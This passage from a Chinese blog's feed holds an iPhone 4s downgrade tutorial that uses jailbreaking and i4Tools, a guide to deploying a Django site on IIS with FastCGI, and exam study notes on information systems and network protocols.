<td> v7.98.27，<a href="https://d-ali4tool.i4.cn/i4tools/V7/v7.98/27/i4Tools_v7.98.27_Setup.exe">此下载链接可能具有时效性</a></td>
</tr>
</tbody>
</table>
<hr>
<h1 id="视频版降级步骤">4. 视频版降级步骤</h1>
<div style="position: relative; width: 100%; height: 0;  padding-bottom: 75%;">
<pre><code>&lt;iframe src="//player.bilibili.com/player.html?aid=458641420&amp;bvid=BV165411n7Nf&amp;cid=283750738&amp;page=1" scrolling="no"
        border="0" frameborder="no" framespacing="0" allowfullscreen="true"
        style="position: absolute; width: 100%;height: 100%; left: 0;top: 0;"&gt;
&lt;/iframe&gt;</code></pre>
</div>
<hr>
<h1 id="文字版降级步骤">5. 文字版降级步骤</h1>
<h2 id="设备越狱">5.1. 设备越狱</h2>
<ol type="1">
<li>将设备连接 PC，打开爱思助手，进入<code>刷机越狱</code>页面，选择<code>一键越狱</code>。
&gt; Mac 版爱思助手不支持 32 位设备越狱，需要使用 PC 电脑。</li>
</ol>
<p><a href="https://imgchr.com/i/sRPjVH"><img src="https://s3.ax1x.com/2021/01/19/sRPjVH.png" alt="sRPjVH.png"></a></p>
<p><a href="https://imgchr.com/i/sRP4a9"><img src="https://s3.ax1x.com/2021/01/19/sRP4a9.md.png" alt="sRP4a9.md.png"></a></p>
<ol start="2" type="1">
<li>点击<code>开始越狱</code>按钮，再按照爱思助手给的提示，在设备上进行越狱即可。
&gt;
iPhone4s 是不完美越狱，重启后会失效。所以如果越狱不成功时，重新执行爱思助手给的步骤，耐心点。</li>
</ol>
<p><a href="https://imgchr.com/i/sRPhVJ"><img src="https://s3.ax1x.com/2021/01/19/sRPhVJ.png" alt="sRPhVJ.png"></a></p>
<h2 id="安装插件源及插件">5.2. 安装插件源及插件</h2>
<ol type="1">
<li>越狱完成后，打开 Cydia 软件，添加插件源，待 Cydia 刷新后，点击<code>回到Cydia</code>。
&gt; 源地址：http://apt.91.com &gt;
经 2021 年 1 月 16 日测试，上述源正常可用。</li>
</ol>
<p><a href="https://imgchr.com/i/sRP726"><img src="https://s3.ax1x.com/2021/01/19/sRP726.png" alt="sRP726.png"></a></p>
<ol start="2" type="1">
<li>进入搜索页面，搜索<code>进入DFU降级模式</code>插件，并安装，之后设备会自动进入 DFU 模式，不用担心，可通过电脑查看设备状态。</li>
</ol>
<p><a href="https://imgchr.com/i/sRPHxK"><img src="https://s3.ax1x.com/2021/01/19/sRPHxK.png" alt="sRPHxK.png"></a></p>
<h2 id="开始降级">5.3. 开始降级</h2>
<ol type="1">
<li>打开爱思助手，进入<code>刷机越狱</code>页面，选择专业刷机，并导入固件。</li>
</ol>
<p><a href="https://imgchr.com/i/sRPqKO"><img src="https://s3.ax1x.com/2021/01/19/sRPqKO.md.png" alt="sRPqKO.md.png"></a></p>
<ol start="2" type="1">
<li>右侧选择<code>常规快速刷机</code>，再点击<code>开始刷机</code>按钮即可。刷机过程中，设备会重启几次，静静等待就好。</li>
</ol>
<p><a href="https://imgchr.com/i/sRPoP1"><img src="https://s3.ax1x.com/2021/01/19/sRPoP1.md.png" alt="sRPoP1.md.png"></a></p>
<p><a href="https://imgchr.com/i/sRiSPI"><img src="https://s3.ax1x.com/2021/01/19/sRiSPI.md.jpg" alt="sRiSPI.md.jpg"></a></p>
<ol start="3" type="1">
<li>刷机完成后，经典的 iOS 6 版本初始化配置页面就出来了，享受它吧。</li>
</ol>
<p><a href="https://imgchr.com/i/sRPLrD"><img src="https://s3.ax1x.com/2021/01/19/sRPLrD.png" alt="sRPLrD.png"></a></p>
<p><a href="https://imgchr.com/i/sRPvad"><img src="https://s3.ax1x.com/2021/01/19/sRPvad.png" alt="sRPvad.png"></a></p>
]]></content>
      <categories>
        <category>Tutorials</category>
      </categories>
      <tags>
        <tag>iPhone4s</tag>
        <tag>iOS6.1.3</tag>
        <tag>iOS降级</tag>
      </tags>
  </entry>
  <entry>
    <title>【Tutorials】基于 Django 的个人网站项目部署到 IIS 服务器</title>
    <url>/p/52924f0a.html</url>
    <content><![CDATA[<h1 id="背景">1. 背景</h1>
<p>  去年的时候，一时兴起购买了一年的云服务器，同时还买了个域名，想着基于 Django 编写一个静态的个人简历网站，再在代码里面加了点网站访问记录的处理逻辑，存储到 MySQL 数据库中。接下来，就如何将 Django 项目打包部署到 Windows
Server2016 版本的 IIS 服务器中，进行简单地介绍。</p>
<span id="more"></span>
<h1 id="部署步骤">2. 部署步骤</h1>
<ol type="1">
<li><p>将整个项目文件夹上传到服务器中。</p></li>
<li><p>打开 IIS，添加网站，设置网站别名和项目路径，绑定 http 类型和主机名。
</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="string">网站名称:</span> <span class="string">任意</span></span><br><span class="line"><span class="string">物理路径:</span> <span class="string">Django项目的根目录</span></span><br><span class="line"><span class="string">http类型:</span> <span class="string">根据需求，配置http访问还是https访问,</span> <span class="string">https需要申请SSL证书。</span></span><br><span class="line"><span class="string">主机名称:</span> <span class="string">域名地址</span></span><br></pre></td></tr></tbody></table></figure> <img src="/p/52924f0a/添加网站.webp" alt="添加网站"><p></p></li>
<li><p>在处理程序映射中，添加模块映射。 </p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="string">请求路径:</span> <span class="string">*</span></span><br><span class="line"><span class="string">模块:</span> <span class="string">FastCgiModule</span></span><br><span class="line"><span class="string">可执行文件:</span> <span class="string">C:\Project\myResume\Python37\python.exe|"C:\Project\myResume\Python37\Lib\site-packages\wfastcgi.py"</span></span><br><span class="line"><span class="string">名称:</span> <span class="string">任意自取</span></span><br><span class="line"><span class="string">请求限制:</span> <span class="string">取消勾选</span></span><br></pre></td></tr></tbody></table></figure> <img src="/p/52924f0a/进入处理程序映射.webp" alt="进入处理程序映射"> <img src="/p/52924f0a/添加模块映射.webp" alt="添加模块映射"> <img src="/p/52924f0a/设置请求限制.webp" alt="设置请求限制"><p></p></li>
<li><p>在 FastCGI 设置中，选择上一步添加的 FastCGI 应用程序，双击进入编辑界面。
</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="string">完整路径:</span> <span class="string">python程序路径</span></span><br><span class="line"><span class="string">参数:</span> <span class="string">Django项目的虚拟环境中的wfastcgi.py文件路径</span></span><br></pre></td></tr></tbody></table></figure> <img src="/p/52924f0a/配置FasyCGI设置.webp" alt="配置FasyCGI设置"> <img src="/p/52924f0a/配置FasyCGI应用程序.webp" alt="配置FasyCGI应用程序"><p></p></li>
<li><p>在 FastCGI 属性中，添加环境变量。 </p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">WSGI_HANDLER:</span> <span class="string">django.core.wsgi.get_wsgi_application()</span></span><br><span class="line"><span class="attr">PYTHONPATH:</span> <span class="string">C:\Project\myResume</span></span><br><span class="line"><span class="attr">DJANGO_SETTINGS_MODULE:</span> <span class="string">myResume.settings(项目设置文件)</span></span><br></pre></td></tr></tbody></table></figure> <img src="/p/52924f0a/编辑环境变量.webp" alt="编辑环境变量"><p></p></li>
<li><p>右键网站名，选择添加虚拟目录，设置别名和静态文件的物理路径，点击确定。
<img src="/p/52924f0a/静态资源添加至虚拟目录.webp" alt="静态资源添加至虚拟目录"> <img src="/p/52924f0a/编辑虚拟目录.webp" alt="编辑虚拟目录"></p></li>
<li><p>在项目的静态文件 static 路径下，新建一个 web.config 文件，填入以下内容 (name 与第 3 步的<code>名称</code>保持一致)。
</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">handlers</span>&gt;</span> </span><br><span class="line">      <span class="tag">&lt;<span class="name">remove</span> <span class="attr">name</span>=<span class="string">"myResumeFcgi"</span>/&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">handlers</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure> <img src="/p/52924f0a/修改web配置文件.webp" alt="修改web配置文件"><p></p></li>
<li><p>最后，在左侧网站列表，右键选择网站名，重新启动网站即可。</p></li>
</ol>
]]></content>
      <categories>
        <category>Tutorials</category>
      </categories>
      <tags>
        <tag>Tutorials</tag>
        <tag>Django项目</tag>
        <tag>IIS部署</tag>
      </tags>
  </entry>
  <entry>
    <title>【信管备考知识点】第 1 章 - 信息化和信息系统</title>
    <url>/p/209469e.html</url>
    <content><![CDATA[<blockquote>
<p>参考书籍：《信息系统项目管理师教程》第三版，清华大学出版社</p>
</blockquote>
<hr>
<h1 id="信息系统与信息化">1. 信息系统与信息化</h1>
<h2 id="信息的定义香农">1.1. 信息的定义（香农）</h2>
<p>信息就是能够用来消除不确定性的东西。</p>
<h2 id="信息的特征">1.2. 信息的特征</h2>
<pre class="mermaid">graph TB
A(客观性) 
B(普遍性) 
C(无限性) 
D(动态性)
E(相对性) 
F(依附性) 
G(变换性) 
H(传递性)
I(层次性) 
J(系统性) 
K(转化型)</pre>
<h2 id="信息的质量属性">1.3. 信息的质量属性</h2>
<table>
<colgroup>
<col style="width: 7%">
<col style="width: 11%">
<col style="width: 80%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">序号</th>
<th>属性名</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"> 1</td>
<td> 精确性</td>
<td>对事物状态描述的<code>精准</code>程度</td>
</tr>
<tr class="even">
<td style="text-align: center;"> 2</td>
<td> 完整性</td>
<td>对事物状态描述的<code>全面</code>程度，完整信息应包含所有重要事实</td>
</tr>
<tr class="odd">
<td style="text-align: center;"> 3</td>
<td> 可靠性</td>
<td>信息的来源、采集方法、传输过程是<code>可信任</code>的</td>
</tr>
<tr class="even">
<td style="text-align: center;"> 4</td>
<td> 及时性</td>
<td>获得信息的时刻与事件发生时刻的<code>间隔</code>长短</td>
</tr>
<tr class="odd">
<td style="text-align: center;"> 5</td>
<td> 经济型</td>
<td>信息获取、传输带来的<code>成本</code>在可接受范围内</td>
</tr>
<tr class="even">
<td style="text-align: center;"> 6</td>
<td> 可验证性</td>
<td>信息的主要质量属性可以被<code>证实或证伪</code>的程度</td>
</tr>
<tr class="odd">
<td style="text-align: center;"> 7</td>
<td> 安全性</td>
<td>在信息的生命周期中，信息可被<code>非授权访问</code>的可能性</td>
</tr>
</tbody>
</table>
<h2 id="信息的功能">1.4. 信息的功能</h2>
<blockquote>
<p>为认识世界提供依据 为改造世界提供指导 为有序的建立提供保证
为资源开发提供条件 为知识生产提供材料</p>
</blockquote>
<h2 id="信息的传输模型">1.5. 信息的传输模型</h2>
<p><img src="/p/209469e/信息的传输模型.webp" alt="信息的传输模型"> &gt; 信息只有流动起来才能体现其价值。 &gt;
信息的传输技术是信息技术的核心。 &gt;
当噪声携带的信息达到一定程度时，在信道中传输的信息可以被噪声掩盖，导致信息传输失败。</p>
<h2 id="信息系统性能">1.6. 信息系统性能</h2>
<p>决定信息系统性能在于编码器和译码器 主要性能指标：有效性、可靠性。</p>
<table>
<colgroup>
<col style="width: 7%">
<col style="width: 8%">
<col style="width: 84%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">序号</th>
<th style="text-align: center;">指标</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"> 1</td>
<td style="text-align: center;"> 有效性</td>
<td>在系统中传送尽可能多的信息</td>
</tr>
<tr class="even">
<td style="text-align: center;"> 2</td>
<td style="text-align: center;"> 可靠性</td>
<td>要求信宿收到的信息尽可能与信源发出的一致，即：失真尽可能小</td>
</tr>
</tbody>
</table>
<h2 id="系统的特性">1.7. 系统的特性</h2>
<pre class="mermaid">graph TB
A(目的性)
B(整体性)
C(层次性)
D(稳定性)
E(突变性)
F(自组织性)
G(相似性)
H(相关性)
J(环境适应性)</pre>
<h2 id="信息系统的特性">1.8. 信息系统的特性</h2>
<pre class="mermaid">graph TB
A(开放性)
B(脆弱性)
C(健壮性)</pre>
<h2 id="信息化的五个层次从小到大">1.9. 信息化的五个层次（从小到大）</h2>
<blockquote>
<p>产品信息化 企业信息化 产业信息化 国民经济信息化 社会生活信息化</p>
</blockquote>
<h2 id="信息化的主要内涵">1.10. 信息化的主要内涵</h2>
<table>
<colgroup>
<col style="width: 6%">
<col style="width: 6%">
<col style="width: 86%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">序号</th>
<th style="text-align: center;">名称</th>
<th>内容</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"> 1</td>
<td style="text-align: center;"> 主体</td>
<td>全体社会成员</td>
</tr>
<tr class="even">
<td style="text-align: center;"> 2</td>
<td style="text-align: center;"> 时域</td>
<td>是一个长期的过程</td>
</tr>
<tr class="odd">
<td style="text-align: center;"> 3</td>
<td style="text-align: center;"> 空域</td>
<td>政治、经济、文化、军事、社会的一切领域</td>
</tr>
<tr class="even">
<td style="text-align: center;"> 4</td>
<td style="text-align: center;"> 手段</td>
<td>基于现代信息技术的先进社会生产工具</td>
</tr>
<tr class="odd">
<td style="text-align: center;"> 5</td>
<td style="text-align: center;"> 途径</td>
<td>创建信息时代的社会生产力<br>推动社会生产关系及社会上层建筑的改革</td>
</tr>
<tr class="even">
<td style="text-align: center;"> 6</td>
<td style="text-align: center;"> 目标</td>
<td>使国家的综合实力、社会的文明素质和人民的生活质量全面提神</td>
</tr>
</tbody>
</table>
<h2 id="国家信息化体系的六要素及关系图">1.11.
国家信息化体系的六要素及关系图</h2>
<figure>
<img src="/p/209469e/国家信息化体系六要素.webp" alt="国家信息化体系六要素">
<figcaption aria-hidden="true">国家信息化体系六要素</figcaption>
</figure>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">序号</th>
<th>名称</th>
<th>关键字</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"> 1</td>
<td> 信息资源</td>
<td>核心任务</td>
</tr>
<tr class="even">
<td style="text-align: center;"> 2</td>
<td> 信息网络</td>
<td>基础设施</td>
</tr>
<tr class="odd">
<td style="text-align: center;"> 3</td>
<td> 信息技术应用</td>
<td>龙头</td>
</tr>
<tr class="even">
<td style="text-align: center;"> 4</td>
<td> 信息技术和产业</td>
<td>物质基础</td>
</tr>
<tr class="odd">
<td style="text-align: center;"> 5</td>
<td> 信息化人才</td>
<td>成功之本</td>
</tr>
<tr class="even">
<td style="text-align: center;"> 6</td>
<td> 信息化政策法规和标准规范</td>
<td>保障</td>
</tr>
</tbody>
</table>
<h2 id="信息系统的生命周期">1.12. 信息系统的生命周期</h2>
<pre class="mermaid">graph LR
A1(系统规划) --&gt; B1(系统分析) --&gt; C1(系统设计) --&gt; D1(系统实施) --&gt; E1(运行维护)
A2(立项: 系统规划) --&gt; B2(开发: 系统分析/系统设计/系统实施) --&gt; C2(运维) --&gt; D2(消亡)
A3(启动) --&gt; B3(计划) --&gt; C3(执行) --&gt; D3(收尾)</pre>
<hr>
<h1 id="信息系统开发方法">2. 信息系统开发方法</h1>
<h2 id="结构化方法生命周期法">2.1. 结构化方法（生命周期法）</h2>
<ol type="1">
<li>组成：<code>结构化分析</code>、<code>结构化设计</code>、<code>结构化程序设计</code></li>
<li>精髓：自顶向下、逐步求精、模块化设计</li>
</ol>
<h2 id="结构化方法的主要特点">2.2. 结构化方法的主要特点</h2>
<ol type="1">
<li>开发目标清晰化</li>
<li>开发工作阶段化</li>
<li>开发文档规范化</li>
<li>设计方法结构化</li>
</ol>
<h2 id="结构化方法的不足和局限性">2.3. 结构化方法的不足和局限性</h2>
<ol type="1">
<li>开发周期长</li>
<li>难适应需求变化</li>
<li>很少考虑数据结构</li>
</ol>
<blockquote>
<p>不适用于规划较大、复杂的系统开发。</p>
</blockquote>
<h2 id="面向对象方法object-orientedoo">2.4.
面向对象方法（Object-Oriented，OO）</h2>
<blockquote>
<p>任何事务都可以看成一个对象</p>
</blockquote>
<h2 id="面向对象方法的特点">2.5. 面向对象方法的特点</h2>
<ol type="1">
<li>使系统的描述及信息模型的表示与客观实体相对应，符合人们的思维习惯。</li>
<li>有利于系统开发过程中用户于开发人员的交流和沟通。</li>
</ol>
<h2 id="面向对象方法的不足">2.6. 面向对象方法的不足</h2>
<ol type="1">
<li>必需依靠一定的面向对象技术支持</li>
<li>在大型项目的开发上具有局限性</li>
<li>不能涉足系统分析之前的开发环节</li>
</ol>
<blockquote>
<p>一些大型系统的开发，通常将结构化方法和面向对象方法结合起来。
使用结构化方法自顶向下整体划分。
使用面向对象方法自底向上进行开发实现。</p>
</blockquote>
<h2 id="原型化方法快速原型法原型法">2.7.
原型化方法（快速原型法、原型法）</h2>
<blockquote>
<p>根据用户初步需求，利用系统开发工具，快速简历一个系统模型展示给用户，在此基础上与用户交流，最终实现用户需求的信息系统快速开发的方法。</p>
</blockquote>
<h2 id="原型化方法的开发过程">2.8. 原型化方法的开发过程</h2>
<pre class="mermaid">graph TD
A((Start))--&gt;B(确定用户基本需求) --&gt; C(设计系统初始需求) --&gt; D(试用和评价原型) --&gt; E(是否满足)
E --否--&gt; G(修改和完善原型) --&gt; D(试用和评价原型)
E{是否满足} --是--&gt; F(整理原型,提供文档)--&gt; Z((END))</pre>
<h2 id="原型法划分">2.9. 原型法划分</h2>
<table>
<colgroup>
<col style="width: 18%">
<col style="width: 13%">
<col style="width: 68%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">划分类型</th>
<th>划分名称</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">是否实现功能</td>
<td>水平原型</td>
<td>功能的导航，未真实实现功能</td>
</tr>
<tr class="even">
<td style="text-align: center;">是否实现功能</td>
<td>垂直原型</td>
<td>也称结构化原型，实现一部分功能，常用于复杂算法实现上</td>
</tr>
<tr class="odd">
<td style="text-align: center;">原型的最终结果</td>
<td>抛弃式原型</td>
<td>基于原型达到预期目的（收集确定需求）后抛弃原型</td>
</tr>
<tr class="even">
<td style="text-align: center;">原型的最终结果</td>
<td>演化式原型</td>
<td>基于原型，增量式开发</td>
</tr>
</tbody>
</table>
<h2 id="原型法的特点">2.10. 原型法的特点</h2>
<ol type="1">
<li>缩短开发周期，成本和风险降低</li>
<li>以用户为中心进行开发，用户参与度大大提高</li>
<li>用户参与全过程，有利于系统移交、运行和维护</li>
</ol>
<h2 id="原型法的不足">2.11. 原型法的不足</h2>
<ol type="1">
<li>开发的环境要求高</li>
<li>管理水平要求高</li>
</ol>
<h2 id="面向服务方法service-oriented">2.12.
面向服务方法（Service-Oriented）</h2>
<ol type="1">
<li>构件：将相关对象按照业务功能进行分组</li>
<li>跨构件的功能调用：采用接口的形式暴露出来</li>
<li>将接口的定义与实现进行解耦，则催生了服务和面向服务的开发方法（SO）</li>
</ol>
<h2 id="面向服务方法可解决的问题">2.13. 面向服务方法可解决的问题</h2>
<ol type="1">
<li>如何使信息系统快速响应需求与环境的变化</li>
<li>提高系统可复用性，信息资源共享和系统之间的互操作性</li>
</ol>
<hr>
<h1 id="常规信息系统集成技术">3. 常规信息系统集成技术</h1>
<h2 id="网络协议">3.1. 网络协议</h2>
<blockquote>
<p>为计算机网络中进行数据交换而建立的规则、标准或约定的集合</p>
</blockquote>
<h2 id="网络协议三要素">3.2. 网络协议三要素</h2>
<ol type="1">
<li>语义：要做什么（What）</li>
<li>语法：该如何做（How）</li>
<li>语序：做的顺序（Order）</li>
</ol>
<h2 id="osi协议分层自下而上">3.3. OSI 协议分层（自下而上）</h2>
<table>
<colgroup>
<col style="width: 7%">
<col style="width: 66%">
<col style="width: 26%">
</colgroup>
<thead>
<tr class="header">
<th>协议层名称</th>
<th>说明</th>
<th>举例</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>物理层</td>
<td>物理联网媒介，如电缆连线连接器</td>
<td><code>RS232</code>、<code>F.35</code>、<code>RJ-45</code>、<code>FDDI</code></td>
</tr>
<tr class="even">
<td>数据链路层</td>
<td>控制网络层与物理层的通信，将从网络层接收到的数据分割成特定的可被物理层传输的帧</td>
<td><code>IEEE 802.3/2</code>、<code>HDLC</code>、<code>PPP</code>、<code>ATM</code></td>
</tr>
<tr class="odd">
<td>网络层</td>
<td>将网络地址（如 IP 地址）翻译成对应的物理地址（如网卡地址），并决定如何将数据从发送方路由到接收方</td>
<td><code>IP</code>、<code>ICMP</code>、<code>IGMP</code>、<code>IPX</code>、<code>ARP</code></td>
</tr>
<tr class="even">
<td>传输层</td>
<td>负责确保数据<code>可靠</code>、<code>顺序</code>、<code>无错</code>地从 A 点传输到 B 点</td>
<td><code>TCP</code>、<code>UDP</code>、<code>SPX</code></td>
</tr>
<tr class="odd">
<td>会话层</td>
<td>负责在网络中的节点之间建立和维持通信，以及提供交互会话的管理功能</td>
<td><code>RPC</code>、<code>SQL</code>、<code>NFS</code></td>
</tr>
<tr class="even">
<td>表示层</td>
<td>应用程序与网络之间的 “翻译官”，格式化数据，管理数据的加解密、数据转换、格式化和文本压缩</td>
<td><code>JPEG</code>、<code>ASCII</code>、<code>GIF</code>、<code>DES</code>、<code>MPEG</code></td>
</tr>
<tr class="odd">
<td>应用层</td>
<td>对软件提供接口以使程序能够使用网络服务</td>
<td><code>HTTP</code>、<code>Telnet</code>、<code>FTP</code>、<code>SMTP</code></td>
</tr>
</tbody>
</table>
<blockquote>
<p>巧记口诀：巫术网传会飙英</p>
</blockquote>
<h2 id="网络协议与标准">3.4. 网络协议与标准</h2>
<p>以太网规范 <code>IEEE 802.3</code> 是重要的局域网协议，其包括：</p>
<table>
<thead>
<tr class="header">
<th>协议</th>
<th style="text-align: center;">名称</th>
<th>速率</th>
<th>传输介质</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> IEEE 802.3</td>
<td style="text-align: center;"> 标准以太网</td>
<td> 10Mbps</td>
<td> 细同轴电缆</td>
</tr>
<tr class="even">
<td> IEEE 802.3u</td>
<td style="text-align: center;"> 快速以太网</td>
<td> 100Mbps</td>
<td> 双绞线</td>
</tr>
<tr class="odd">
<td> IEEE 802.3z</td>
<td style="text-align: center;"> 千兆以太网</td>
<td> 1000Mbps</td>
<td> 光纤或双绞线</td>
</tr>
</tbody>
</table>
<blockquote>
<p>另外，<code>802.11</code> 也是日常使用且重要的协议，即：无线局域网 WLAN 标准协议</p>
</blockquote>
<h2 id="osi协议与tcpcp协议对应关系">3.5.
OSI 协议与 TCP/CP 协议对应关系</h2>
<pre class="mermaid">graph LR
A1(应用层) --&gt; B1(应用层) --&gt; C1(FTP/HTTP/SMTP/DHCP/Telnet/SNMP等) 
A2(表示层) --&gt; B1(会话层)
A3(会话层) --&gt; B1(会话层)
A4(传输层) --&gt; B2(传输层)--&gt; C2(TCP/UDP等) 
A5(网络层) --&gt; B3(网络层)--&gt; C3(IP/ARP/ICMP/IGMP等) 
A6(数据链路层) --&gt; B4(网络接口层) --&gt; C4(IEEE802.3/IEEE802.5/HDLC/PPP/ATM等) 
A7(物理层) --&gt; B4(网络接口层)</pre>
<h2 id="重要协议">3.6. 重要协议</h2>
<table>
<colgroup>
<col style="width: 3%">
<col style="width: 4%">
<col style="width: 14%">
<col style="width: 77%">
</colgroup>
<thead>
<tr class="header">
<th>序号</th>
<th>协议</th>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> 1</td>
<td>IP</td>
<td>Ineternet Protocol</td>
<td> 网络层的核心协议，在源地址和目的地址之间传送数据包，提供的服务通常被认为是<code>无连接</code>的和<code>不可靠</code>的</td>
</tr>
<tr class="even">
<td> 2</td>
<td>ARP</td>
<td> 地址解析协议</td>
<td>用于动态地完成 IP 地址向物理地址的转换</td>
</tr>
<tr class="odd">
<td> 3</td>
<td>RARP</td>
<td> 反向地址转换协议</td>
<td>用于动态地完成物理地址向 IP 地址的转换</td>
</tr>
<tr class="even">
<td> 4</td>
<td>ICMP</td>
<td> 网际控制报文协议</td>
<td>用于在 IP 主机、路由器之间出传递控制消息</td>
</tr>
<tr class="odd">
<td> 5</td>
<td>TCP</td>
<td> 传输控制协议</td>
<td>采用重发技术，为应用程序提供<code>可靠</code>、<code>面向连接</code>、<code>全双工</code>的数据传输服务</td>
</tr>
<tr class="even">
<td> 6</td>
<td>UDP</td>
<td> 用户数据报协议</td>
<td>是一种<code>不可靠</code>、<code>无连接</code>的协议（TCP 提供可靠性，UDP 提供传输数率）</td>
</tr>
<tr class="odd">
<td>7</td>
<td>FTP</td>
<td> 文件传输协议</td>
<td>运行在 <code>TCP</code> 之上，需要建立两条 TCP 连接，一条传输控制信息（21 端口），一条数传文件内容（20 端口）</td>
</tr>
<tr class="even">
<td>8</td>
<td>HTTP</td>
<td> 超文本传输协议</td>
<td>建立在 <code>TCP</code> 之上，用于从 WWW 服务器传输超文本到本地浏览器的传送协议</td>
</tr>
<tr class="odd">
<td> 9</td>
<td>Telnet</td>
<td> 远程登录协议</td>
<td>建立在 <code>TCP</code> 之上，是登录和仿真程序，基本功能是允许用户都能路进入远程计算机系统</td>
</tr>
<tr class="even">
<td> 10</td>
<td>SMTP</td>
<td> 简单邮件传输协议</td>
<td>建立在 <code>TCP</code> 之上，一种提高<code>可靠</code>且<code>有效</code>的电子邮件传输协议</td>
</tr>
<tr class="odd">
<td> 11</td>
<td>TFTP</td>
<td> 简单文件传输协议</td>
<td>建立在 <code>UDP</code> 之上，提供<code>不可靠</code>的数据流传输服务</td>
</tr>
<tr class="even">
<td> 12</td>
<td>DNS</td>
<td> 域名系统</td>
<td>建立在 <code>UDP</code> 之上，进行域名解析的服务器</td>
</tr>
<tr class="odd">
<td> 13</td>
<td>DHCP</td>
<td> 动态主机配置协议</td>
<td>建立在 <code>UDP</code> 之上，实现自动分配 IP 地址</td>
</tr>
<tr class="even">
<td> 14</td>
<td>SNMP</td>
<td> 简单网络管理协议</td>
<td>建立在 <code>UDP</code> 之上，一系列网络管理规范的集合，可在 IP、IPX、AppleTalk 和其他传输协议上使用</td>
</tr>
</tbody>
</table>
<h2 id="网络设备">3.7. 网络设备</h2>
<ol type="1">
<li>网络交换：通过一定的设备（如交换机），将不同的信号或者信号形式转换为对方可识别的信号，从而达到通信目的的一种交换形式。</li>
<li>常见的有：数据交换、线路交换、报文交换、分组交换。</li>
</ol>
<h2 id="网络存储技术">3.8. 网络存储技术</h2>
<table>
<colgroup>
<col style="width: 5%">
<col style="width: 55%">
<col style="width: 21%">
<col style="width: 18%">
</colgroup>
<thead>
<tr class="header">
<th>网络存储技术</th>
<th>特点及说明</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> DAS (直接附加存储)</td>
<td> 存储设备通过 SCSI 接口直接连接服务器，其本身是硬件的堆叠，存储操作依赖于服务器，不带有任何存储系统</td>
<td> -</td>
<td> 难扩展，传递距离、连接数量、传输数率等受限，基本已被 NAS 代替</td>
</tr>
<tr class="even">
<td> NAS (网络附加存储)</td>
<td> 存储设备通过标准的网络拓扑结构连接到一系列计算机上，去掉了大部分的计算功能，仅提供文件系统功能。</td>
<td>响应速度快，传输速率高，支持即插即用，性能特点是小文件级别的共享存储</td>
<td>难以获得满意的性能</td>
</tr>
<tr class="odd">
<td> SAN (存储区域网络)</td>
<td> 采用块级别存储。SAN 是通过专用高速网将一个或多个网络存储设备和服务器连接起来的专用存储系统，其最大特点是将存储设备从传统的以太网分离出来，
成为独立的存储区域网络的系统结构。</td>
<td>管理方便，扩展容易，且具备无限扩展能力</td>
<td> -</td>
</tr>
</tbody>
</table>
<h2 id="网络接入技术">3.9. 网络接入技术</h2>
<blockquote>
<p>有线接入：PSTN/ISDN/ADSL/FTTx+LAN/HFC
无线接入：GPRS/WIFI/3G、4G、5G</p>
</blockquote>
<h2 id="网络规划设计">3.10. 网络规划设计</h2>
<ol type="1">
<li>网络工程分为<code>网络规划</code>、<code>网络设计</code>、<code>网络实施</code>三个阶段。
<ul>
<li>网络规划包含<code>网络需求分析</code>、<code>可行性分析</code>和<code>对现有网络的分析与描述</code>。</li>
<li>网络系统的设计阶段包含确定<code>网络总体目标</code>和<code>设计原则</code>。</li>
<li>网络设计中，主要采用分层设计模型，引入了<code>核心层</code>、<code>汇聚层</code>、<code>接入层</code>三个关键层的概念。
<ul>
<li>接入层：网络中直接面向用户连接或访问网络的部分称为接入层，其目的是允许终端用户连接到网络，因此，接入层交换机（或路由器，下同）具有低成本和高端口密度特性。</li>
<li>汇聚层：汇聚层是核心层和接入层的分界面，完成网络访问策略控制、数据包处理、过滤、寻址，以及其他数据处理的任务。汇聚层交换机与接入层比较，需要更高的性能，更少的接口和更高的交换速率。</li>
<li>核心层：网络主干部分称为核心层，核心层的主要目的在于通过高速转发通信，提供优化、可靠的骨干传输结构，因此，核心层交换机应拥有更高的可靠性、性能和吞吐量。</li>
</ul></li>
</ul></li>
</ol>
<h2 id="网络设计工作内容">3.11. 网络设计工作内容</h2>
<ol type="1">
<li>网络拓扑结构设计</li>
<li>主干网络（核心层）设计</li>
<li>汇聚层和接入层设计</li>
<li>广域网连接与远程访问设计</li>
<li>无线网络设计</li>
<li>网络安全设计</li>
<li>设备选型</li>
</ol>
<h2 id="信息安全的基本要素">3.12. 信息安全的基本要素</h2>
<pre class="mermaid">graph TB
A(机密性)
B(完整性)
C(可用性)
D(可控性)
E(可审查性)</pre>
<h2 id="数据仓库技术">3.13. 数据仓库技术</h2>
<blockquote>
